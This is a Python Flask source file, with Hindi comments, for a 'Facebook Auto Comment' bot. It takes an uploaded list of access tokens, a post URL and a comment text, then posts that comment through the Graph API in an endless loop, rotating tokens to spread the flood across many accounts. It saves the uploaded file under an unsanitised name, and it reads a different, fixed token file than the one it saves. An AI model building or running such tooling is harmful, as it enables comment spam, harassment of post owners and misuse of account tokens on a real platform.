from flask import Flask, request, render_template_string
import os
import threading
import time
import requests
import json
import re

app = Flask(__name__)

DATA_DIR = "data"
os.makedirs(DATA_DIR, exist_ok=True)

TOKEN_FILE = os.path.join(DATA_DIR, "tokens.txt")
TIME_FILE = os.path.join(DATA_DIR, "time.txt")

# Data Save करने का Function
def save_data(token_file, post_url, comment_text, delay):
    token_path = os.path.join(DATA_DIR, token_file.filename)
    token_file.save(token_path)

    with open(TIME_FILE, "w") as f:
        f.write(str(delay))

    return token_path, post_url, comment_text

# Post ID Extract करने का Function
def extract_post_id(post_url):
    match = re.search(r'facebook\.com/(\d+)/posts/(pfbid\w+)', post_url)
    if match:
        user_id = match.group(1)
        post_code = match.group(2)
        return f"{user_id}_{post_code}"
    return None

# ऑटो Comment भेजने का Function
def send_comments(post_url, comment_text):
    try:
        with open(TOKEN_FILE, "r") as f:
            tokens = f.read().strip().split("\n")  # Multiple Tokens सपोर्ट
        with open(TIME_FILE, "r") as f:
            delay = int(f.read().strip())

        post_id = extract_post_id(post_url)
        if not post_id:
            print(f"[!] Invalid Post URL: {post_url}")
            return
        
        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}

        token_index = 0
        while True:
            token = tokens[token_index]  # Token को बारी-बारी से चुनना

            url = f"https://graph.facebook.com/v15.0/{post_id}/comments"
            payload = json.dumps({'access_token': token, 'message': comment_text})

            response = requests.post(url, data=payload, headers=headers)
            if response.ok:
                print(f"[+] Comment sent to Post ID {post_id} using Token {token_index + 1}")
            else:
                print(f"[x] Failed for Post ID {post_id}: {response.status_code} {response.text}")

            time.sleep(delay)

            # अगला Token इस्तेमाल करना, फिर लूप में वापिस आना
            token_index = (token_index + 1) % len(tokens)

    except Exception as e:
        print(f"[!] Error: {e}")

# HTML Form
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Auto Comment</title>
    <style>
        body { background-color: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; margin: 0; padding: 0; }
        .container { background: #111; max-width: 400px; margin: 50px auto; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(255, 255, 255, 0.2); }
        h1 { color: #00ffcc; }
        form { display: flex; flex-direction: column; }
        label { text-align: left; font-weight: bold; margin: 10px 0 5px; }
        input, button { padding: 10px; border: 1px solid #444; border-radius: 5px; background: #222; color: white; margin-bottom: 10px; }
        button { background-color: #00ffcc; color: black; cursor: pointer; }
        button:hover { background-color: #00cc99; }
        footer { margin-top: 20px; color: #777; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Facebook Auto Comment</h1>
        <form action="/" method="post" enctype="multipart/form-data">
            <label>Upload Token File (.txt):</label>
            <input type="file" name="token_file" accept=".txt" required>

            <label>Enter Facebook Post URL:</label>
            <input type="text" name="post_url" required>

            <label>Enter Comment Text:</label>
            <input type="text" name="comment_text" required>

            <label>Delay in Seconds:</label>
            <input type="number" name="delay" value="5" min="1">

            <button type="submit">Submit</button>
        </form>
        <footer>© 2025 Auto Comment Bot. All Rights Reserved.</footer>
    </div>
</body>
</html>
"""

# Flask Route
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        token_file = request.files.get("token_file")
        post_url = request.form.get("post_url")
        comment_text = request.form.get("comment_text")
        delay = int(request.form.get("delay", 5))

        if token_file and post_url and comment_text:
            token_path, post_url, comment_text = save_data(token_file, post_url, comment_text, delay)
            threading.Thread(target=send_comments, args=(post_url, comment_text), daemon=True).start()

    return render_template_string(HTML_TEMPLATE)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 3000))
    app.run(host='0.0.0.0', port=port)
